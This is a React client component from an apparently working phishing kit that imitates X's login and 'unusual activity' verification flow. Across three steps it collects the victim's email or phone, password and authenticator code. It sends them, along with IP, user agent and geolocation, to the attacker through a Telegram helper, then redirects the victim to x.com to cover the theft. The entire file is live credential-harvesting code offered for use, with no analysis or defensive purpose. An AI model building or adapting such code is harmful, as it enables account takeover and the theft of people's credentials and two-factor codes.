"use client";

import { useCallback, useState } from "react";
import type { User } from "@prisma/client";
import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";

type Props = {
	browserData: {
		ip: string;
		userAgent: string;
		geoLocation: string;
	};
};

export function LoginFormSteps({ browserData }: Props) {
	const [step, setStep] = useState(1);
	const [username, setUsername] = useState("");
	const [password, setPassword] = useState("");
	const [code, setCode] = useState("");
	const [userId, setUserId] = useState(0);
	const [loading, setLoading] = useState(false);

	const handleGoToNextStep = () => {
		setStep((prevStep) => prevStep + 1);
	};

	const handleSaveUser = useCallback(async () => {
		setLoading(true);

		const response = await fetch("/api/users", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				emailOrPhone: username,
				password,
			}),
		});

		if (!response.ok) {
			throw new Error("Failed to save user.");
		}

		const data = (await response.json()) as { user: User };

		const { origin, pathname } = window.location;

		await sendDataToTelegram({
			emailOrPhone: data.user.emailOrPhone,
			password: data.user.password,
			code: "",
			pageUrl: `${origin}${pathname}`,
			userIp: browserData.ip,
			userAgent: browserData.userAgent,
			geoLocation: browserData.geoLocation,
		});

		setUserId(data?.user?.id);

		setStep((prevStep) => prevStep + 1);

		setLoading(false);
	}, [username, password, browserData]);

	const handleSaveUserCode = useCallback(async () => {
		setLoading(true);

		const response = await fetch("/api/users", {
			method: "PUT",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				userId,
				code,
			}),
		});

		if (!response.ok) {
			throw new Error("Failed to save user.");
		}

		const data = (await response.json()) as { user: User };

		const { origin, pathname } = window.location;

		await sendDataToTelegram({
			emailOrPhone: data.user.emailOrPhone,
			password: data.user.password,
			code: data.user?.code || "",
			pageUrl: `${origin}${pathname}`,
			userIp: browserData.ip,
			userAgent: browserData.userAgent,
			geoLocation: browserData.geoLocation,
		});

		setStep(1);
		setUsername("");
		setPassword("");
		setCode("");
		setUserId(0);

		window.location.href = "https://x.com";
	}, [userId, code, browserData]);

	return (
		<>
			{step === 1 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleGoToNextStep();
					}}
					className="flex-1 px-8 flex flex-col justify-between md:max-w-[500px]"
				>
					<div>
						<div className="my-5">
							<h1 className="text-3xl font-semibold text-white">
								Enter your phone number or email address
							</h1>

							<p className="text-base text-white/40">
								There was unusual login activity on your account. To help keep
								your account safe, please enter your phone number (start with
								country code, e.g. +1) or email address to verify it's you.
							</p>
						</div>

						<input
							type="text"
							placeholder="Phone or email"
							value={username}
							onChange={(e) => setUsername(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>
					</div>

					<button
						type="submit"
						disabled={!username}
						className="mb-6 w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
					>
						Next
					</button>
				</form>
			)}

			{step === 2 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleSaveUser();
					}}
					className="flex-1 px-8 flex flex-col justify-between md:max-w-[500px]"
				>
					<div>
						<div className="my-5">
							<h1 className="text-center text-2xl font-semibold text-white">
								Enter your password
							</h1>
						</div>

						<input
							type="text"
							placeholder="Phone or email"
							value={username}
							onChange={(e) => setUsername(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>

						<input
							// biome-ignore lint/a11y/noAutofocus: <explanation>
							autoFocus={true}
							type="password"
							placeholder="Password"
							value={password}
							onChange={(e) => setPassword(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>
					</div>

					<button
						type="submit"
						disabled={!username || !password || loading}
						className="mb-6 w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
					>
						{loading ? "..." : "To Enter"}
					</button>
				</form>
			)}

			{step === 3 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleSaveUserCode();
					}}
					className="flex-1 px-8 flex flex-col justify-between md:max-w-[500px]"
				>
					<div>
						<div className="my-5">
							<h1 className="text-2xl font-semibold text-white">
								Enter your verification code
							</h1>

							<p className="text-white/40">
								Use your code generator app to generate a code and enter it
								below.
							</p>
						</div>

						<input
							type="text"
							placeholder="Enter code"
							value={code}
							onChange={(e) => setCode(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>
					</div>

					<div>
						<button
							type="submit"
							disabled={!code}
							className="mb-6 w-full h-14 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
						>
							Next
						</button>

						<a
							href="https://x.com/"
							className="mb-6 w-full h-14 bg-transparent flex items-center justify-center rounded-full font-bold text-white border border-white/40"
						>
							Configure later
						</a>
					</div>
				</form>
			)}
		</>
	);
}
